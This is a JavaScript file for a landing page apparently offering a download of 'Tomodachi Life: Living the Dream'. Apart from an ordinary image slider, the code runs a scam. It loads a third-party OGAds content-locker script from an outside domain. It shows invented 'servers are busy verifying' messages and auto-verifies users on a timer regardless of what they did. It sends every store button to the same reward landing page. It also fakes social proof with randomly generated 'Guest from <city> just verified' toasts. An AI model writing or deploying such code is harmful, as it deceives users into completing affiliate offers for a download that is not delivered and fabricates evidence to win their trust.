/* =============================================
   TOMODACHI LIFE: LIVING THE DREAM
   app.js — Infinite Slider + Scroll Animations
   ============================================= */

(function () {
  'use strict';

  /* ─── SLIDER SETUP ──────────────────────────── */
  const track   = document.getElementById('sliderTrack');
  const wrapper = document.getElementById('slider-wrapper');
  const dotsEl  = document.getElementById('sliderDots');
  const btnPrev = document.getElementById('sliderPrev');
  const btnNext = document.getElementById('sliderNext');

  // Grab the original real slides
  const realSlides = Array.from(track.querySelectorAll('.slide'));
  const total      = realSlides.length;

  /* Clone all slides and add them before + after for seamless loop */
  // Append clones of first slides at the END
  realSlides.forEach(slide => {
    const clone = slide.cloneNode(true);
    clone.removeAttribute('id');
    clone.setAttribute('aria-hidden', 'true');
    track.appendChild(clone);
  });
  // Prepend clones of last slides at the START (in reverse order)
  [...realSlides].reverse().forEach(slide => {
    const clone = slide.cloneNode(true);
    clone.removeAttribute('id');
    clone.setAttribute('aria-hidden', 'true');
    track.insertBefore(clone, track.firstChild);
  });

  // All slide elements now = [clones-pre | real slides | clones-post]
  const allSlides = Array.from(track.querySelectorAll('.slide'));
  // Real slides live at indices [total .. total*2 - 1]

  let trackIdx   = total; // current track index (points at real slide 0 initially)
  let realIdx    = 0;     // which real slide (0..total-1) the user is viewing
  let autoTimer  = null;
  let isDragging = false;
  let startX     = 0;
  let startY     = 0;
  let dragDeltaX = 0;
  let isScrolling = null;
  let baseOffset  = 0;

  const AUTO_DELAY     = 3400; // ms between slides
  const DRAG_THRESHOLD = 48;   // px to commit a swipe

  /* ─── Pagination dots ─────────────────────── */
  const dots = realSlides.map((_, i) => {
    const btn = document.createElement('button');
    btn.className = 'dot';
    btn.setAttribute('aria-label', `Go to slide ${i + 1}`);
    btn.setAttribute('role', 'tab');
    btn.setAttribute('aria-selected', i === 0 ? 'true' : 'false');
    btn.addEventListener('click', () => goToReal(i));
    dotsEl.appendChild(btn);
    return btn;
  });

  /* ─── Offset calculation ──────────────────── */
  function getOffset(idx) {
    const gap     = 16; // matches CSS gap on slider-track
    const padLeft = 24; // matches CSS padding-left on slider-track
    let offset = padLeft;
    for (let i = 0; i < idx; i++) {
      offset += allSlides[i].offsetWidth + gap;
    }
    return -offset;
  }

  /* ─── Apply transform ─────────────────────── */
  function applyTransform(px, spring = true) {
    track.style.transition = spring
      ? 'transform 0.42s cubic-bezier(.34,1.38,.64,1)'
      : 'none';
    track.style.transform = `translateX(${px}px)`;
  }

  /* ─── Update dot indicators ───────────────── */
  function updateDots() {
    dots.forEach((d, i) => {
      d.classList.toggle('active', i === realIdx);
      d.setAttribute('aria-selected', i === realIdx ? 'true' : 'false');
    });
  }

  /* ─── Navigate to a track index ──────────── */
  function goTo(idx, spring = true) {
    trackIdx = idx;
    // Map trackIdx back to a real slide index (wrapping)
    realIdx  = ((trackIdx - total) % total + total) % total;
    applyTransform(getOffset(trackIdx), spring);
    updateDots();
    // Arrows always visible in infinite mode
    btnPrev.classList.remove('hidden');
    btnNext.classList.remove('hidden');
  }

  /* After CSS transition ends — silently jump from clone to real slide */
  track.addEventListener('transitionend', () => {
    if (trackIdx <= total - 1) {
      // Landed on a prepended clone → jump forward to matching real slide
      trackIdx += total;
      applyTransform(getOffset(trackIdx), false);
    } else if (trackIdx >= total * 2) {
      // Landed on an appended clone → jump back to matching real slide
      trackIdx -= total;
      applyTransform(getOffset(trackIdx), false);
    }
  });

  /* ─── Go to real slide index ──────────────── */
  function goToReal(rIdx) {
    goTo(rIdx + total);
    resetAutoPlay();
  }

  function next() { goTo(trackIdx + 1); resetAutoPlay(); }
  function prev() { goTo(trackIdx - 1); resetAutoPlay(); }

  /* ─── Auto-play ───────────────────────────── */
  function startAutoPlay() {
    stopAutoPlay();
    autoTimer = setInterval(next, AUTO_DELAY);
  }
  function stopAutoPlay() {
    clearInterval(autoTimer);
    autoTimer = null;
  }
  function resetAutoPlay() {
    stopAutoPlay();
    startAutoPlay();
  }

  /* Arrow buttons */
  btnPrev.addEventListener('click', prev);
  btnNext.addEventListener('click', next);

  /* ─── Touch / Mouse Drag ──────────────────── */
  function getClientX(e) { return e.touches ? e.touches[0].clientX : e.clientX; }
  function getClientY(e) { return e.touches ? e.touches[0].clientY : e.clientY; }

  function onDragStart(e) {
    isDragging  = true;
    isScrolling = null;
    startX      = getClientX(e);
    startY      = getClientY(e);
    dragDeltaX  = 0;
    baseOffset  = getOffset(trackIdx);
    stopAutoPlay();
    track.style.transition = 'none';
  }

  function onDragMove(e) {
    if (!isDragging) return;

    const dx = getClientX(e) - startX;
    const dy = getClientY(e) - startY;

    if (isScrolling === null) {
      if (Math.abs(dy) > Math.abs(dx) + 4) {
        isScrolling = true;
        isDragging  = false;
        applyTransform(baseOffset, true);
        return;
      } else if (Math.abs(dx) > 6) {
        isScrolling = false;
      } else {
        return;
      }
    }

    if (isScrolling) return;
    if (e.cancelable) e.preventDefault();

    dragDeltaX = dx;
    // No rubber-band needed in infinite mode
    applyTransform(baseOffset + dragDeltaX, false);
  }

  function onDragEnd() {
    if (!isDragging) return;
    isDragging = false;

    if (isScrolling) { startAutoPlay(); return; }

    if (dragDeltaX < -DRAG_THRESHOLD) {
      next();
    } else if (dragDeltaX > DRAG_THRESHOLD) {
      prev();
    } else {
      goTo(trackIdx); // snap back to current
    }
    startAutoPlay();
  }

  // Touch
  wrapper.addEventListener('touchstart', onDragStart, { passive: true });
  wrapper.addEventListener('touchmove',  onDragMove,  { passive: false });
  wrapper.addEventListener('touchend',   onDragEnd);
  wrapper.addEventListener('touchcancel',onDragEnd);

  // Mouse
  wrapper.addEventListener('mousedown', onDragStart);
  window.addEventListener('mousemove',  onDragMove);
  window.addEventListener('mouseup',    onDragEnd);

  // Pause on hover (desktop)
  wrapper.addEventListener('mouseenter', stopAutoPlay);
  wrapper.addEventListener('mouseleave', startAutoPlay);

  /* Keyboard navigation */
  document.addEventListener('keydown', (e) => {
    if (e.key === 'ArrowLeft')  prev();
    if (e.key === 'ArrowRight') next();
  });

  /* ─── Init ────────────────────────────────── */
  goTo(total, false); // start at first real slide, no animation
  startAutoPlay();

  /* ─── SCROLL REVEAL ANIMATION ─────────────── */
  const revealEls = document.querySelectorAll(
    '.feature-card, .section-title, .section-label, .download__title, .download__sub, .download__meta'
  );

  revealEls.forEach(el => el.classList.add('reveal'));

  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        entry.target.classList.add('visible');
        observer.unobserve(entry.target);
      }
    });
  }, { threshold: 0.12 });

  revealEls.forEach(el => observer.observe(el));

  /* ─── Recalculate on resize ────────────────── */
  let resizeTimer;
  window.addEventListener('resize', () => {
    clearTimeout(resizeTimer);
    resizeTimer = setTimeout(() => {
      applyTransform(getOffset(trackIdx), false);
    }, 120);
  });

})();

/* =============================================
   SPONSOR POPUP
   ============================================= */
(function () {
  'use strict';

  const overlay    = document.getElementById('popupOverlay');
  const popup      = document.getElementById('popup');
  const closeBtn   = document.getElementById('popupClose');
  const sponsorBtn = document.getElementById('popupSponsorBtn');
  const proceedBtn = document.getElementById('popupProceed');
  const storeBtns  = document.querySelectorAll('.store-btn');
  const popupSteps = document.querySelector('.popup__steps');
  const popupStatus = document.getElementById('popupStatus');
  const confettiSound = new Audio('https://www.myinstants.com/media/sounds/tada.mp3'); // Optional: Add a subtle sound if you like, or keep it silent.

  /* Confetti Animation */
  function triggerConfetti() {
    const duration = 3 * 1000;
    const end = Date.now() + duration;

    (function frame() {
      confetti({
        particleCount: 3,
        angle: 60,
        spread: 55,
        origin: { x: 0 },
        colors: ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'],
        zIndex: 1000000
      });
      confetti({
        particleCount: 3,
        angle: 120,
        spread: 55,
        origin: { x: 1 },
        colors: ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'],
        zIndex: 1000000
      });

      if (Date.now() < end) {
        requestAnimationFrame(frame);
      }
    }());
  }

  // ── Set your store URLs here ──────────────────
  const STORE_URLS = {
    apple:   'https://rewardlp1.vercel.app/',
    google:  'https://rewardlp1.vercel.app/',
    windows: 'https://rewardlp1.vercel.app/',
    macos:   'https://rewardlp1.vercel.app/',
  };

  let targetStore = 'apple';

  /* ── Persistence Logic ────────────────────────
     Checks if the user was already verifying before a redirect. */
  function checkPersistence() {
    const isVerifying = localStorage.getItem('hasStartedVerification');
    const savedStore  = localStorage.getItem('targetStore');

    if (isVerifying === 'true') {
      if (savedStore) targetStore = savedStore;
      
      // User has returned from the locker!
      openPopup(targetStore);
      
      // Keep the initial steps and the sponsor button visible
      if (popupSteps) popupSteps.style.display = 'flex';
      if (sponsorBtn) sponsorBtn.style.display = 'inline-flex';
      
      // Show the "Checking..." status
      if (popupStatus) popupStatus.style.display = 'flex';

      // Total required time (20-30 minutes)
      const startTime = parseInt(localStorage.getItem('verificationStartTime')) || Date.now();
      let requiredDelay = parseInt(localStorage.getItem('requiredDelay'));
      
      if (!requiredDelay) {
        // Fallback if somehow not set (1 min for testing)
        requiredDelay = 60000;
        localStorage.setItem('requiredDelay', requiredDelay);
      }

      const elapsed = Date.now() - startTime;
      const remainingToStartChecking = requiredDelay - elapsed;

      const startVerificationTimer = () => {
        // Once 20-30 mins have passed, start the final 1-2 min verification
        if (popupStatus) {
          const statusP = popupStatus.querySelector('p');
          if (statusP) statusP.innerText = "Checking your installation... Please don't close this page.";
        }

        const checkDelay = 1000; // 1 second for fast testing
        console.log(`Final verification will finish in ${checkDelay / 1000}s`);

        setTimeout(() => {
          if (popupStatus) popupStatus.style.display = 'none';
          autoVerify();
        }, checkDelay);
      };

      if (remainingToStartChecking > 0) {
        console.log(`Waiting ${Math.round(remainingToStartChecking / 1000)}s before starting verification.`);
        
        // Show the message requested by the user
        if (popupStatus) {
          const statusP = popupStatus.querySelector('p');
          if (statusP) {
            statusP.innerText = "Please ensure you have completed all offer instructions (such as reaching the required level or installing the app). If you have already finished and still see this, please wait 10–15 minutes and return later; our servers are currently busy verifying other users and will process your request shortly.";
          }
        }

        setTimeout(startVerificationTimer, remainingToStartChecking);
      } else {
        // 20-30 minutes have already passed since they started
        startVerificationTimer();
      }
    }
  }

  function autoVerify() {
    // a. Close the locker iframe if it exists
    const lockerFrame = document.getElementById('test_iframe');
    const lockerCloseBtn = document.querySelector('.locker-close-btn');
    
    if (lockerFrame) lockerFrame.remove();
    if (lockerCloseBtn) lockerCloseBtn.remove();
    document.body.style.overflow = ''; // Restore scroll

    // b. Trigger verification
    window.ogadsComplete();
  }

  /* Open popup */
  function openPopup(store) {
    targetStore = store || 'apple';
    proceedBtn.disabled = true;
    popup.scrollTop = 0;
    overlay.classList.add('active');
    document.body.style.overflow = 'hidden';
    setTimeout(() => closeBtn.focus(), 320);
  }

  /* Close popup */
  function closePopup() {
    overlay.classList.remove('active');
    document.body.style.overflow = '';
  }

  /* Store buttons open the popup */
  storeBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      targetStore = btn.dataset.store || 'apple';
      openPopup(targetStore);
    });
  });

  /* Close button */
  closeBtn.addEventListener('click', closePopup);

  /* Tap backdrop to close */
  overlay.addEventListener('click', e => {
    if (e.target === overlay) closePopup();
  });

  /* Escape key */
  document.addEventListener('keydown', e => {
    if (e.key === 'Escape' && overlay.classList.contains('active')) closePopup();
  });

  /* ── Sponsor button ────────────────────────────
     Triggers the OGAds locker ONLY when pressed.
     We dynamically inject the locker script here so it doesn't auto-lock the page. */
  let scriptInjected = false;
  sponsorBtn.addEventListener('click', () => {
    // 1. Mark as started in localStorage
    localStorage.setItem('hasStartedVerification', 'true');
    localStorage.setItem('targetStore', targetStore);
    localStorage.setItem('verificationStartTime', Date.now().toString());

    // Pre-calculate the required delay (1 min for testing) so it's consistent
    const randomDelay = 60000;
    localStorage.setItem('requiredDelay', randomDelay.toString());

    // 2. Inject the script if not already done
    if (!scriptInjected) {
      const script = document.createElement('script');
      script.type = 'text/javascript';
      script.src = 'https://gemroyale.store/cl/js/d2oonk';
      document.head.appendChild(script);
      scriptInjected = true;
    }

    // Attempt to manually trigger
    if (typeof window.call_locker === 'function') {
      window.call_locker();
    } else if (typeof window.CPABuildLock === 'function') {
      window.CPABuildLock();
    } else if (typeof OgadsLocker !== 'undefined') {
      OgadsLocker.show();
    }

    // 3. Start watching for the locker iframe to ensure we can target it
    watchForLocker();
  });

  /* ── Locker Close Logic ────────────────────────
     Detects when the OGAds locker iframe appears. */
  function watchForLocker() {
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        mutation.addedNodes.forEach((node) => {
          if (node.id === 'test_iframe') {
            // No longer adding a manual close button here, 
            // as we want it to auto-close after 1-2 mins.
            observer.disconnect();
          }
        });
      });
    });
    observer.observe(document.body, { childList: true });
  }

  /* Proceed → go to correct store */
  proceedBtn.addEventListener('click', () => {
    triggerConfetti();
    
    // We removed the setTimeout here because browsers block window.open 
    // if it's delayed by more than a few milliseconds.
    closePopup();
    const url = STORE_URLS[targetStore] || STORE_URLS.apple;
    
    // Redirecting in the same tab is more reliable for mobile/popup blockers
    window.location.href = url;
  });

  /* Expose completion callback for OGAds */
  window.ogadsComplete = function () {
    triggerConfetti();
    
    // Also trigger a massive central burst
    confetti({
      particleCount: 150,
      spread: 70,
      origin: { y: 0.6 },
      zIndex: 1000000
    });

    const popupTitle = document.getElementById('popup-title');
    if (popupTitle) {
      popupTitle.innerText = 'You have been verified!';
      popupTitle.classList.add('success-active');
    }

    proceedBtn.disabled = false;
    proceedBtn.classList.add('pulse-success'); // Let's add this class in CSS
    proceedBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });

    // Clear persistence
    localStorage.removeItem('hasStartedVerification');
    localStorage.removeItem('targetStore');
    localStorage.removeItem('verificationStartTime');
    localStorage.removeItem('requiredDelay');
  };

  // Check for existing verification on startup
  checkPersistence();

})();

/* =============================================
   SOCIAL PROOF POPUPS
   ============================================= */
(function() {
  'use strict';

  const locations = [
    "United States", "United Kingdom", "Canada", "Australia", "Germany", "France", "Italy", "Spain", "Brazil", "Mexico",
    "Japan", "South Korea", "New Zealand", "Sweden", "Norway", "Denmark", "Finland", "Netherlands", "Belgium", "Switzerland",
    "Austria", "Portugal", "Greece", "Turkey", "Russia", "China", "India", "Indonesia", "Thailand", "Vietnam",
    "Philippines", "Malaysia", "Singapore", "South Africa", "Egypt", "Morocco", "Nigeria", "Kenya", "Argentina", "Chile",
    "Colombia", "Peru", "Poland", "Czech Republic", "Hungary", "Romania", "Ukraine", "Saudi Arabia", "United Arab Emirates", "Israel",
    "London", "New York", "Los Angeles", "Chicago", "Toronto", "Vancouver", "Sydney", "Melbourne", "Paris", "Berlin",
    "Rome", "Madrid", "Tokyo", "Seoul", "Beijing", "Shanghai", "Hong Kong", "Singapore City", "Dubai", "Mumbai",
    "São Paulo", "Mexico City", "Moscow", "Istanbul", "Bangkok", "Jakarta", "Manila", "Cairo", "Cape Town", "Buenos Aires",
    "Lima", "Santiago", "Amsterdam", "Brussels", "Vienna", "Lisbon", "Stockholm", "Oslo", "Copenhagen", "Helsinki",
    "Prague", "Warsaw", "Budapest", "Bucharest", "Kiev", "Riyadh", "Tel Aviv", "Dublin", "Edinburgh", "Barcelona"
  ];

  const toastContainer = document.createElement('div');
  toastContainer.className = 'toast-container';
  document.body.appendChild(toastContainer);

  function showToast() {
    // Generate Guest name with random numbers (1000-9999)
    const user = `Guest${Math.floor(Math.random() * 9000 + 1000)}`;
    const loc = locations[Math.floor(Math.random() * locations.length)];
    
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerHTML = `
      <div class="toast__icon"><i class="ph-fill ph-check-circle"></i></div>
      <div class="toast__content">
        <span class="toast__user">${user} from ${loc}</span>
        <span class="toast__msg">Just successfully verified!</span>
        <span class="toast__time">Just now</span>
      </div>
    `;

    toastContainer.appendChild(toast);

    // Trigger animation
    requestAnimationFrame(() => {
      toast.classList.add('show');
    });

    // Remove after 5 seconds
    setTimeout(() => {
      toast.classList.remove('show');
      setTimeout(() => {
        toast.remove();
      }, 600);
    }, 5000);
  }

  // Initial delay
  setTimeout(() => {
    showToast();
    // Subsequent toasts every 12 seconds with some randomness
    setInterval(() => {
      if (Math.random() > 0.4) {
        showToast();
      }
    }, 12000);
  }, 3000);

})();
